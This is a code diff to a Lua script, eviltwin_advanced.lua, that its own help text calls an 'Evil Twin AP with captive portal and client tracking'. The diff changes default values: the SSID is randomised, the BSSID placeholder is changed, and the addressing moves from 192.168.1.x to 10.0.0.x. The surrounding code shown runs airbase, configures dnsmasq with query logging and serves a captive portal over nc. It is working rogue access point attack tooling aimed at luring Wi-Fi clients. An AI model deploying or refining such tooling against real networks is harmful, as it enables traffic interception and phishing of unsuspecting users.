@@ -1,9 +1,9 @@
 #!/usr/bin/env lua
 
 local iface = arg[1]
-local ssid = arg[2] or "FreeWiFi"
+local ssid = arg[2] or ("AP_" .. tostring(math.floor(os.time() * 1000 % 10000)))
 local channel = tonumber(arg[3]) or 6
-local bssid = arg[4] or "00:11:22:33:44:55"
+local bssid = arg[4] or "AA:BB:CC:DD:EE:FF"
 local portal_port = tonumber(arg[5]) or 8080
 local hop_interval = tonumber(arg[6]) or 0
 
@@ -32,7 +32,7 @@ local function check_monitor_mode()
 end
 
 local function write_dnsmasq_conf()
-  local conf = "interface=at0\ndhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h\ndhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\n"
+  local conf = "interface=at0\ndhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\n"
   local f = io.open("/tmp/dnsmasq.conf", "w")
   if f then f:write(conf); f:close() end
   telemetry("config_written", '{"file":"/tmp/dnsmasq.conf"}')
@@ -70,8 +70,8 @@ local function start_evil_twin()
   telemetry("airbase_start", '{"ssid":' .. json_escape(ssid) .. ',"channel":' .. tostring(channel) .. '}')
   os.execute("sleep 2")
   os.execute("ifconfig at0 up 2>/dev/null")
-  os.execute("ifconfig at0 192.168.1.1 netmask 255.255.255.0 2>/dev/null")
-  telemetry("interface_ready", '{"interface":"at0","ip":"192.168.1.1"}')
+  os.execute("ifconfig at0 10.0.0.1 netmask 255.255.255.0 2>/dev/null")
+  telemetry("interface_ready", '{"interface":"at0","ip":"10.0.0.1"}')
 end
 
 local function start_services()
@@ -84,7 +84,7 @@ local function start_services()
   io.open("/tmp/captive_portal.html", "r"):close()
   local server_cmd = "while true; do { echo -e 'HTTP/1.1 200 OK\\r\\nContent-Length: " .. tostring(#portal_html) .. "\\r\\n\\r\\n" .. portal_html .. "'; } | nc -l -p " .. tostring(portal_port) .. " -q 1 2>/dev/null; done &"
   os.execute(server_cmd)
-  telemetry("portal_start", '{"port":' .. tostring(portal_port) .. ',"url":"http://192.168.1.1:' .. tostring(portal_port) .. '"}')
+  telemetry("portal_start", '{"port":' .. tostring(portal_port) .. ',"url":"http://10.0.0.1:' .. tostring(portal_port) .. '"}')
 end
 
 local function channel_hop()
@@ -120,7 +120,7 @@ if arg[1] == "--help" then
   print("Usage: eviltwin_advanced.lua <interface> [ssid] [channel] [bssid] [portal_port] [hop_interval]")
   print("Evil Twin AP with captive portal and client tracking")
   print("Set hop_interval > 0 to enable channel hopping")
-  print("Example: eviltwin_advanced.lua wlan0 FreeWiFi 6 00:11:22:33:44:55 8080 0")
+  print("Example: eviltwin_advanced.lua wlan0 FreeWiFi 6 AA:BB:CC:DD:EE:FF 8080 0")
   os.exit(0)
 end
 
